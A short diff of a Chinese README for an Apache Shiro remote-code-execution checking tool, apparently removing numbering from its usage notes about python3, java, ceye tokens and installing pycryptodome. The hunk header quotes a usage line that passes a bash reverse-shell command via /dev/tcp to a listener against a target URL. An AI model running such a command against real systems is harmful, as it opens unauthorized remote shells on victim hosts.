@@ -98,9 +98,9 @@ python3 shiro-check-rce.py -u {target_URL} -c "bash -i >& /dev/tcp/{your_nc_ip}/
 
 # 0x03 注意事项
 
-* 1、本程序需要 python3 环境以及 java环境
-* 2、在进行漏洞检测时，-c 指定 ping 的 URL 和 -t 指定的 token 需要是同一 ceye 账户的。
-* 3、在安装`pycryptodome`库时，可能会碰到一些问题，可以根据报错信息进行排查，或者到网上找寻相关资料
+* 本程序需要 python3 环境以及 java环境
+* 在进行漏洞检测时，-c 指定 ping 的 URL 和 -t 指定的 token 需要是同一 ceye 账户的。
+* 在安装`pycryptodome`库时，可能会碰到一些问题，可以根据报错信息进行排查，或者到网上找寻相关资料
 
 
 ![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)
